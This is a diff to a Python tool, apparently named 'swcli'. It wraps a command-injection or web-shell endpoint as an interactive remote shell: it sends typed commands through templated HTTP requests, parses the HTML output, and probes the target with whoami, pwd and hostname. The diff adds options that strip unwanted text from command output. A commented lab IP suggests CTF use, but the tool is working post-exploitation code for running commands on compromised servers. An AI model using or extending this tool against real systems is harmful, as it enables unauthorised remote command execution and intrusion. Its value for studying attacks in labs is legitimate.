@@ -17,6 +17,49 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 METHOD_POST="POST"
 METHOD_GET="GET"
 
+def remove_content_after_split(main_content: str, split_after: str) -> str:
+    """
+    Removes all content from main_content after and including split_after.
+
+    Parameters:
+    main_content (str): The main string content from which to remove the content.
+    split_after (str): The substring after which all content should be removed.
+
+    Returns:
+    str: The modified string with content removed after split_after.
+    """
+    # Find the index of split_after in main_content
+    index = main_content.find(split_after)
+
+    # If split_after is found, slice the string up to that index
+    if index != -1:
+        return main_content[:index]
+    else:
+        # If split_after is not found, return the original main_content
+        return main_content
+
+def remove_content_before_split(main_content: str, split_before: str) -> str:
+    """
+    Removes all content from main_content before and including split_before.
+
+    Parameters:
+    main_content (str): The main string content from which to remove the content.
+    split_before (str): The substring before which all content should be removed.
+
+    Returns:
+    str: The modified string with content removed before split_before.
+    """
+    # Find the index of split_before in main_content
+    index = main_content.find(split_before)
+
+    # If split_before is found, slice the string from that index + length of split_before
+    if index != -1:
+        return main_content[index + len(split_before):]
+    else:
+        # If split_before is not found, return the original main_content
+        return main_content
+
+
 def execute_command(url, method=METHOD_POST,params={}, headers={}, data={}):
     """
     Sends a request to the specified URL with the given parameters and headers.
@@ -59,7 +102,7 @@ def execute_command(url, method=METHOD_POST,params={}, headers={}, data={}):
 
 from bs4 import BeautifulSoup
 
-def extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return, bs4_selector, regex):
+def extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return, bs4_selector, regex, rm, rm_after, rm_before):
     """
     Extracts the result from the command return in the given HTML content.
 
@@ -97,11 +140,20 @@ def extract_result_from_command_return(html_content, str_valid_command_return, s
                     if len(result_groups) == 0:
                         print(f"Regex {regex} produced no match, will not be applied.")
                     elif len(result_groups) >1:
-                        print(f"Regex {regex} produced more than 1 match, will only take first.")
+                        logging.info(f"Regex {regex} produced more than 1 match, will only take first.")
                     cmd_result=result_groups[0]
 
                 except Exception as e:
-                    print(f"Regex {regex} produced an error, will not be applied.")
+                    print(f"Regex {regex} produced an error, will not be applied. Error: {e}")
+
+            if rm_after is not None:
+                cmd_result = remove_content_after_split(cmd_result, rm_after)
+            if rm_before is not None:
+                cmd_result = remove_content_before_split(cmd_result, rm_before)
+            
+            # go through rm that is a list in order to remove tes
+            for str_to_remove in rm:
+                cmd_result=" ".join(cmd_result.split(str_to_remove))
                 
 
             # Check if multiple tags were found and print a warning message
@@ -151,7 +203,7 @@ def populate_template(cmd, temple_dict):
 
     return populated_dict
 
-def populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex):
+def populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex, rm, rm_after, rm_before):
     # init returned variables
     valid_result=False
     cmd_result=""
@@ -163,7 +215,7 @@ def populate_template_and_execute_commands(command, str_valid_command_return, st
     http_response, html_content = execute_command(url, method=method, params=populated_params, headers=populated_headers, data=populated_data)
 
     if html_content:
-        valid_result, cmd_result = extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return,bs4_selector, regex)
+        valid_result, cmd_result = extract_result_from_command_return(html_content, str_valid_command_return, str_wrong_command_return,bs4_selector, regex, rm, rm_after, rm_before)
         # soup = BeautifulSoup(html_content, 'html.parser')
     else:
         valid_result, cmd_result= (False, "Command processed, but no specific condition met.")
@@ -171,7 +223,7 @@ def populate_template_and_execute_commands(command, str_valid_command_return, st
     return valid_result, cmd_result
 
 
-def main(url, str_valid_command_return, str_wrong_command_return,bs4_selector="html", method=METHOD_POST, template_params={}, template_headers={}, template_data={"command": "%cmd%"}, regex=None):
+def main(url, str_valid_command_return, str_wrong_command_return,bs4_selector="html", method=METHOD_POST, template_params={}, template_headers={}, template_data={"command": "%cmd%"}, regex=None, rm=[], rm_after=None, rm_before=None):
     """
     Main function to handle user input and process commands.
     """
@@ -184,15 +236,20 @@ def main(url, str_valid_command_return, str_wrong_command_return,bs4_selector="h
     bs4_selector=bs4_selector
 
     # Get the user name of the server and current working directory
-    valid_result_whoami, user_name=populate_template_and_execute_commands("whoami", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
-    valid_result_pwd, working_dir=populate_template_and_execute_commands("pwd", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
-    valid_result_hostname, hostname=populate_template_and_execute_commands("hostname", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
+    valid_result_whoami, user_name=populate_template_and_execute_commands("whoami", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex, rm, rm_after, rm_before)
+    valid_result_pwd, working_dir=populate_template_and_execute_commands("pwd", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex, rm, rm_after, rm_before)
+    valid_result_hostname, hostname=populate_template_and_execute_commands("hostname", str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex, rm, rm_after, rm_before)
     if not valid_result_whoami:
         user_name="swcli[fake]"
     if not valid_result_pwd:
         working_dir="/home/swcli[fake]"
     if not valid_result_hostname:
         hostname=url
+
+    # removing spaces and return chars from result commands
+    user_name="".join(user_name.split())
+    working_dir="".join(working_dir.split())
+    hostname="".join(hostname.split())
 
     while True:
         try:
@@ -211,7 +268,7 @@ def main(url, str_valid_command_return, str_wrong_command_return,bs4_selector="h
                 command_index = len(command_history)
 
             # Execute the command
-            valid_result, cmd_result= populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex)
+            valid_result, cmd_result= populate_template_and_execute_commands(command, str_valid_command_return, str_wrong_command_return,bs4_selector, url, method, template_params, template_headers, template_data, regex, rm, rm_after, rm_before)
             if cmd_result != "": # do not display empty line
                 print(cmd_result)
 
@@ -253,6 +310,15 @@ def parse_arguments():
 
     # Add the --regex argument in order to specify a regex for the result of valid commands
     parser.add_argument('--regex', required=False, help='A regular expression to select text after applying the --selector switch, if null, no regex will be applyed.')
+
+    # Add the --rm argument in order to specify a string to remove a string from the result of valid commands 
+    parser.add_argument('--rm', action='append', help='A string to remove a string from the result of valid commands.')
+
+    # Add the --rm_after argument in order to specify a string to remove after said string from the result of valid commands including this string 
+    parser.add_argument('--rm_after', required=False, help='A string to remove after said string from the result of valid commands including this string.')
+
+    # Add the --rm_before argument in order to specify a string to remove before said string from the result of valid commands including this string 
+    parser.add_argument('--rm_before', required=False, help='A string to remove before said string from the result of valid commands including this string.')
     
     # Parse the arguments
     args = parser.parse_args()
@@ -304,6 +370,11 @@ if __name__ == "__main__":
     bs4_selector=args.selector
     method=args.method
     regex=args.regex
+    rm_after=args.rm_after
+    rm_before=args.rm_before
+    if args.rm is None:
+        args.rm=[]
+
 
     template_params=parse_request_elements(args.P)
     template_headers=parse_request_elements(args.H)
@@ -319,4 +390,4 @@ if __name__ == "__main__":
 
     # # url = input("Enter the URL:")
     # url = "http://10.10.244.7/secret/"
-    main(url, str_valid_command_return, str_wrong_command_return, bs4_selector, method=method, template_params=template_params, template_headers=template_headers, template_data=template_data, regex=regex)
+    main(url, str_valid_command_return, str_wrong_command_return, bs4_selector, method=method, template_params=template_params, template_headers=template_headers, template_data=template_data, regex=regex, rm=args.rm, rm_after=rm_after, rm_before=rm_before)
